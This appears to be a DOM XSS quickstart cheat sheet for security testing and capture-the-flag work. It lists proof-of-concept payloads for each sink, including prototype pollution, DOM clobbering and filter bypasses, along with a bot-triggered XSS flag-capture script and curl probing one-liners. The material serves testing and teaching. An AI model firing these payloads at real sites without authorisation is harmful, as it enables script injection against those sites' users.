# DOM XSS Quickstart

Fast track to finding DOM XSS. For deep dives see `scenarios/dom-vulnerabilities/`.

## 1. Identification (5 min)

**Framework fingerprint:**
- AngularJS: view source for `ng-app`, `angular.js`. Payload: `{{$on.constructor('alert(1)')()}}`.
- jQuery: console `typeof jQuery`. Payload for `$(input)`: `<img src=x onerror=alert(1)>`.
- React/Vue/Angular 2+: usually safe by default; look for `dangerouslySetInnerHTML` / `v-html` / `[innerHTML]`.

**Common injection points:**
| Location | Source | Test |
|----------|--------|------|
| Search box | `location.search` | `?q=<img src=x onerror=alert(1)>` |
| URL fragment | `location.hash` | `#<img src=x onerror=alert(1)>` |
| Form inputs | various | Submit with payload |
| postMessage | `event.data` | iframe + postMessage |

## 2. Payloads by sink

| Sink | Payload |
|------|---------|
| `document.write` | `"><svg onload=alert(1)>` |
| `innerHTML` | `<img src=x onerror=alert(1)>` (script tags don't fire) |
| jQuery `$()` | `<img src=x onerror=alert(1)>` |
| jQuery `.attr('href',...)` | `javascript:alert(1)` |
| AngularJS expression | `{{$on.constructor('alert(1)')()}}` |
| `eval()` | `alert(1)` |
| inside `<select>` | `"></select><img src=x onerror=alert(1)>` |
| postMessage HTML | `iframe + postMessage('<img src=1 onerror=alert(1)>','*')` |
| postMessage JS URL | `postMessage('javascript:alert(1)//https:','*')` |
| postMessage JSON | `postMessage('{"type":"load-channel","url":"javascript:alert(1)"}','*')` |
| Prototype pollution | `/?__proto__[transport_url]=data:,alert(1);//` |
| Prototype pollution (eval) | `/?__proto__.sequence=alert(1)-` |
| DOM clobbering (id) | `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">` |
| DOM clobbering (attrs) | `<form id=x tabindex=0 onfocus=alert(1)><input id=attributes></form>` (load `#x`) |

## 3. Burp DOM Invader workflow (1 min)

1. F12 → DOM Invader → toggle ON
2. Enable "Inject URL params"
3. Review Sinks panel
4. "Scan for prototype pollution" → "Scan for gadgets" → "Exploit"

## 4. Quick wins (always try first)

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
{{$on.constructor('alert(1)')()}}
```

## 5. Common mistakes

- Using `<script>` with `innerHTML` (won't fire)
- Forgetting attribute / tag breakouts
- Not clicking link for href-based XSS
- Testing hashchange without iframe wrapper
- Forgetting `//` comment in PP payloads
- Wrong parameter name (always check the source code)

## 6. Detection script (browser console)

```javascript
(function(){
    let risks = [];
    if (document.body.innerHTML.includes(location.search.slice(1))) risks.push('URL param reflected');
    if (document.body.innerHTML.includes(location.hash.slice(1))) risks.push('Hash reflected');
    if (typeof angular !== 'undefined') risks.push('AngularJS detected');
    if (typeof jQuery !== 'undefined') risks.push('jQuery detected');
    let scripts = [...document.scripts].map(s => s.textContent).join('');
    if (scripts.includes('addEventListener') && scripts.includes('message')) risks.push('postMessage listener found');
    risks.length
        ? console.log('%c[!] Potential DOM XSS vectors:', 'color:red;font-weight:bold') || risks.forEach(r => console.log('  - ' + r))
        : console.log('%c[✓] No obvious DOM XSS vectors', 'color:green');
})();
```

## 7. Encoding quick reference

```
HTML:    < = &lt; / &#60; / &#x3C;       > = &gt; / &#62;       " = &quot; / &#34;
URL:     < = %3C   > = %3E   " = %22   ' = %27   space = %20
JS Unicode: alert = alert
```

## 8. Bypass quick hits

```html
<!-- <script> blocked -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<!-- alert blocked -->
<img src=x onerror=window['ale'+'rt'](1)>
<!-- ( blocked -->
<svg onload=alert`1`>
<!-- quotes blocked -->
<img src=x onerror=alert(1)>
```

## 9. Bot-triggered XSS (report-URL / headless browser)

Apps with endpoints that have a headless browser visit your payload URL. Indicators:
- POST endpoint accepts URL/query (`POST /search {"query":"..."}`, `POST /report {"url":"..."}`).
- Page includes WebSocket/Socket.IO (`<script src="/socket.io/socket.io.js">`).
- Bot detects `alert()` and emits flag/secret via WebSocket.

Workflow:
1. Read source code — how does the bot process your input?
2. Connect to WebSocket/Socket.IO first — listen for data events.
3. Send XSS payload via the bot trigger endpoint.
4. Capture exfiltrated data from the WebSocket event.

```python
import socketio, requests
sio = socketio.Client()
@sio.on('flag')  # or 'data', 'result'
def on_flag(data): print(data)
sio.connect("http://target:port")
requests.post("http://target:port/search", json={"query": "<img src=x onerror=alert(1)>"})
```

Key insight: the bot navigates to `http://127.0.0.1/?q=YOUR_INPUT`. Payload renders on the bot's page, flag returns via WebSocket, not HTTP response.

## 10. One-liner tests

```bash
# Test URL parameter
curl "https://target.com/?q=<img src=x onerror=alert(1)>" | grep -i "img src=x"

# Test all parameters
for p in id user search q; do
  curl "https://target.com/?$p=TEST123" | grep -i "TEST123" && echo "[+] $p reflects"
done
```

Most versatile payload: `<img src=x onerror=alert(1)>` — works in HTML, innerHTML, jQuery, document.write contexts.
